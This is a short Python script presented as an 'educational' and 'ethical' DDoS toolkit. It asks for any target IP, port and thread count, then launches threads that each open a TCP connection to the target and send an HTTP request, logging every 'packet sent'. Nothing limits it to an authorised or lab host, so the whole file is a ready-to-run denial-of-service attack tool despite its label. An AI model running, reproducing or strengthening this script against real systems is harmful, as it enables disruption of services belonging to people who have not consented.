import socket
import threading
import time
import os

def banner():
    os.system('clear')
    print("\033[1;32m")
    print("═════════════════════════════════════════════════════")
    print("      🚀 Faizan™ DDoS Educational Toolkit v2.0")
    print("═════════════════════════════════════════════════════")
    print("   Created by: \033[1;36mFaizan™ Mughal\033[1;32m")
    print("   Purpose: Realistic, Ethical DDoS Simulation")
    print("═════════════════════════════════════════════════════\033[0m")

def attack(target_ip, target_port, log_file):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((target_ip, target_port))
        client.send(b"GET /Faizan_DDOS_Test HTTP/1.1\r\n\r\n")
        client.close()
        print(f"\033[1;32m[✓] Packet sent to {target_ip}:{target_port}\033[0m")
        with open(log_file, 'a') as f:
            f.write(f"[✓] Packet sent to {target_ip}:{target_port}\n")
    except:
        print(f"\033[1;31m[✗] Failed to send to {target_ip}:{target_port}\033[0m")

def main():
    banner()
    target_ip = input("\033[1;33m[?] Enter Target IP:\033[0m ")
    target_port = int(input("\033[1;33m[?] Enter Target Port:\033[0m "))
    threads = int(input("\033[1;33m[?] Number of Threads:\033[0m "))
    
    log_dir = "logs"
    os.makedirs(log_dir, exist_ok=True)
    log_file = os.path.join(log_dir, "attack-log.txt")

    print("\n\033[1;34m[~] Starting attack in:\033[0m")
    for i in range(3, 0, -1):
        print(f"   {i}...")
        time.sleep(1)

    print(f"\n\033[1;32m[•] Launching {threads} threads on {target_ip}:{target_port}\033[0m\n")
    
    for i in range(threads):
        thread = threading.Thread(target=attack, args=(target_ip, target_port, log_file))
        thread.start()
        time.sleep(0.01)

    print(f"\n\033[1;36m[✔] Attack finished. Logs saved to {log_file}\033[0m")

if __name__ == "__main__":
    main()
